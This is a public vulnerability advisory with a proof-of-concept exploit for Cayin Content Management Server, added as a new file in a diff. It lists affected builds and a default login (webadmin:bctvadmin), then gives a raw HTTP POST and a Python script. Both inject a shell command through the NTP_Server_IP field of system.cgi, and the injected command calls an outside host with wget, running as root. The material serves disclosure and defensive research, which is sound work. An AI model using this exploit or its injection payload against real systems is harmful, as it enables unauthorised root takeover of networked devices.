@@ -1,0 +1,139 @@
+# Title: Cayin Content Management Server 11.0 - Remote Command Injection (root)
+# Author:LiquidWorm
+# Date: 2020-06-04
+# Vendor: https://www.cayintech.com
+# CVE:  N/A
+Cayin Content Management Server 11.0 Root Remote Command Injection
+
+
+Vendor: CAYIN Technology Co., Ltd.
+Product web page: https://www.cayintech.com
+Affected version: CMS-SE v11.0 Build 19179
+                  CMS-SE v11.0 Build 19025
+                  CMS-SE v11.0 Build 18325
+                  CMS Station (CMS-SE-LXC)
+                  CMS-60 v11.0 Build 19025
+                  CMS-40 v9.0 Build 14197
+                  CMS-40 v9.0 Build 14099
+                  CMS-40 v9.0 Build 14093
+                  CMS-20 v9.0 Build 14197
+                  CMS-20 v9.0 Build 14092
+                  CMS v8.2 Build 12199
+                  CMS v8.0 Build 11175
+                  CMS v7.5 Build 11175
+
+Summary: CAYIN Technology provides Digital Signage
+solutions, including media players, servers, and
+software designed for the DOOH (Digital Out-of-home)
+networks. We develop industrial-grade digital signage
+appliances and tailored services so you don't have
+to do the hard work.
+
+Desc: CAYIN CMS suffers from an authenticated OS
+semi-blind command injection vulnerability using
+default credentials. This can be exploited to inject
+and execute arbitrary shell commands as the root
+user through the 'NTP_Server_IP' HTTP POST parameter
+in system.cgi page.
+
+Tested on: Apache/1.3.42 (Unix)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5570
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5570.php
+
+
+15.05.2020
+
+---
+
+
+Session created with default credentials (webadmin:bctvadmin).
+
+HTTP POST Request:
+-----------------
+
+POST /cgi-bin/system.cgi HTTP/1.1
+Host: 192.168.1.3
+Content-Length: 201
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Smith
+Origin: http://192.168.1.3
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.3/cgi-bin/system.cgi
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: cy_lang=ZH_TW; cy_us=67176fd7d3d05812008; cy_en=c8bef8607e54c99059cc6a36da982f9c009; WEB_STR_RC_MGR=RC_MGR_WEB_PLAYLIST; WEB_STR_SYSTEM=SYSTEM_SETTING; cy_cgi_tp=1591206269_15957
+Connection: close
+
+
+save_system: 1
+system_date: 2020/5/16    06:36:48
+TIMEZONE: 49
+NTP_Service: 1
+NTP_Server_IP: $(wget -q -U 'MyVoiceIsMyPassportVerifyMe' vrfy.zeroscience.mk)
+TEST_NTP: 測試
+reboot1: 1
+reboot_sel1: 4
+reboot_sel2: 1
+reboot_sel3: 1
+font_list: ZH_TW
+
+
+Request recorder @ ZSL:
+-----------------------
+
+Origin of HTTP request: 192.168.1.3:61347
+HTTP GET request to vrfy.zeroscience.mk:
+
+GET / HTTP/1.0
+User-Agent: MyVoiceIsMyPassportVerifyMe
+Host: vrfy.zeroscience.mk
+Accept: */*
+Connection: Keep-Alive
+
+
+PoC script:
+-----------
+
+import requests
+
+url = "http://192.168.1.3:80/cgi-bin/system.cgi"
+
+cookies = {"cy_lang": "ZH_TW",
+           "cy_us": "67176fd7d3d05812008",
+           "cy_en": "c8bef8607e54c99059cc6a36da982f9c009",
+           "WEB_STR_RC_MGR": "RC_MGR_WEB_PLAYLIST",
+           "WEB_STR_SYSTEM": "SYSTEM_SETTING",
+           "cy_cgi_tp": "1591206269_15957"}
+
+headers = {"Cache-Control": "max-age=0",
+           "Origin": "http://192.168.1.3",
+           "Content-Type": "application/x-www-form-urlencoded",
+           "User-Agent": "Smith",
+           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+           "Referer": "http://192.168.1.3/cgi-bin/system.cgi",
+           "Accept-Encoding": "gzip, deflate",
+           "Accept-Language": "en-US,en;q=0.9",
+           "Connection": "close"}
+
+data = {"save_system": "1",
+        "system_date": "2020/5/16    06:36:48",
+        "TIMEZONE": "49",
+        "NTP_Service": "1",
+        "NTP_Server_IP": "$(wget -q -U 'MyVoiceIsMyPassportVerifyMe' vrfy.zeroscience.mk)", # `cmd` or &cmd&
+        "TEST_NTP": "\xe6\xb8\xac\xe8\xa9\xa6",
+        "reboot1": "1",
+        "reboot_sel1": "4",
+        "reboot_sel2": "1",
+        "reboot_sel3": "1",
+        "font_list": "ZH_TW"}
+
+requests.post(url, headers=headers, cookies=cookies, data=data)
